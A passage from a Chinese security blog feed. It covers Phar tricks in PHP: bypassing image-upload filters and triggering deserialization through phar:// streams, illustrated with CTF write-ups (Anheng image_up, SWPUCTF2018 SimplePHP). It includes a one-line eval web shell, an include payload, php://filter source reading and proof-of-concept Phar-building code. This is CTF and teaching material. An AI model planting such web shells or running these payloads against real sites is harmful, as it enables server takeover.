sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://portswigger.net/web-security/os-command-injection" title="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">https://portswigger.net/web-security/os-command-injection</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" title="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar的一些利用姿势</title>
      <link href="/2018/12/24/%C2%96Phar%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
      <url>/2018/12/24/%C2%96Phar%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692</a></p></blockquote><h1 id="Phar的简述"><a href="#Phar的简述" class="headerlink" title="Phar的简述"></a>Phar的简述</h1><p>翻译自手册：<br>phar是什么? Phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p><h1 id="利用姿势一：绕过上传限制"><a href="#利用姿势一：绕过上传限制" class="headerlink" title="利用姿势一：绕过上传限制"></a>利用姿势一：绕过上传限制</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已<br>写一段小代码测试一下：<br>test.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span>'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//./test.jpg/test.php');</span><span class="token delimiter">?></span></code></pre><p>成功包含</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222135923-bb50ed6c-05ae-1.png" alt="image.png"></p><h2 id="例题：安恒11月月赛：image-up"><a href="#例题：安恒11月月赛：image-up" class="headerlink" title="例题：安恒11月月赛：image_up"></a>例题：安恒11月月赛：image_up</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p><a href="http://101.71.29.5:10043/index.php?page=login" target="_blank" rel="noopener">http://101.71.29.5:10043/index.php?page=login</a><br>尝试伪协议读取一波源码</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=</span></code></pre><p>base64解码<br>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>      <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?page=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?page=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>login.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?page=upload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>upload.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token variable">$exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"image"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"image"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>@<span class="token variable">$_upfileS</span><span class="token punctuation">[</span><span class="token string">"image"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">102400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>              <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"image"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"上传成功!"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"上传失败！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"文件过大，上传失败！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>从upload.php可以看出只能上传（”jpg”,”png”,”gif”,”jpeg”）文件，而且再index.php中在包含的文件后面强行加了”.php”,直接包含图片文件明显不可以了，于是就用到了我们的Phar伪协议流，将我们的一句话木马打包成压缩包，然后再将后缀改为<code>.jpg</code>,这样就能通过Phar伪协议去包含我们的一句话木马了。<br>这题有一个坑点，就是时间戳的问题：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span></code></pre><p>这里要<code>time()+8*3600</code>，时区不同所以要加上8小时</p><p>payload：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//./uploads/6b19a5399b7d34fbb3c509ca8c25fd89.jpg/1</span></code></pre><p>菜刀连接即可getflag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130629-57346c8e-05a7-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130646-613ae366-05a7-1.png" alt="image.png"></p><h1 id="利用姿势二：Phar反序列化漏洞"><a href="#利用姿势二：Phar反序列化漏洞" class="headerlink" title="利用姿势二：Phar反序列化漏洞"></a>利用姿势二：Phar反序列化漏洞</h1><p>我们一般利用反序列漏洞，一般都是借助<code>unserialize()</code>函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的<code>Blackhat2018</code>大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发PHP反序列化漏洞。漏洞触发是利用<code>Phar://</code> 伪协议读取phar文件时，会反序列化<code>meta-data</code>储存的信息。</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><p>Phar文件主要包含三至四个部分：</p><h3 id="1-A-stub"><a href="#1-A-stub" class="headerlink" title="1. A stub"></a>1. A stub</h3><p>stub的基本结构：<code>&lt;?php __HALT_COMPILER();</code>，stub必须以<code>__HALT_COMPILER()</code>;来作为结束部分，否则Phar拓展将不会识别该文件。</p><h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a manifest describing the contents</h3><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221212526-e0bed25c-0523-1.png" alt="image.png"></p><h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file contents</h3><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><h3 id="4-a-signature-for-verifying-Phar-integrity"><a href="#4-a-signature-for-verifying-Phar-integrity" class="headerlink" title="4. a signature for verifying Phar integrity"></a>4. a signature for verifying Phar integrity</h3><p>签名格式<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png" alt="image.png"></p><h3 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h3><p>既然都知道Phar文件的基本结构了，那么我们就写一段代码来测试一下<br>PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//签名自动计算</span><span class="token delimiter">?></span></code></pre><p>查看一下phar文件的结构，可以看到Meta-data的内容是以反序列的形式储存的。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221215206-9a88aaa2-0527-1.png" alt="image.png"></p><p>那序列化部分的内容怎么反序列呢？<br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br><strong>小trick：系统文件操作的函数一般都能使用伪协议流，Phar:// 也是ok的</strong><br>写一段小代码测试一下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>"phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//./test.phar/test.txt");</span><span class="token delimiter">?></span></code></pre><p>可以看到成功触发了反序列化</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221220844-ed0aef9a-0529-1.png" alt="image.png"></p><h2 id="实战运用"><a href="#实战运用" class="headerlink" title="实战运用"></a>实战运用</h2><p>一般情况下，利用Phar反序列漏洞有几个条件：</p><pre class=" language-php"><code class="language-php">可以上传Phar文件有可以利用的魔术方法文件操作函数的参数可控</code></pre><h2 id="例题：SWPUCTF2018-SimplePHP"><a href="#例题：SWPUCTF2018-SimplePHP" class="headerlink" title="例题：SWPUCTF2018 SimplePHP"></a>例题：SWPUCTF2018 SimplePHP</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>这题有两个功能：1.查看文件。2.上传文件<br>按流程走一下，先查看一波源码<br><code>file.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>upload_file.php</code>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'function.php'</span><span class="token punctuation">;</span><span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>function.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//show_source(__FILE__);</span><span class="token keyword">include</span> <span class="token string">"base.php"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//mkdir("upload",0777);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>";</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>class.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token 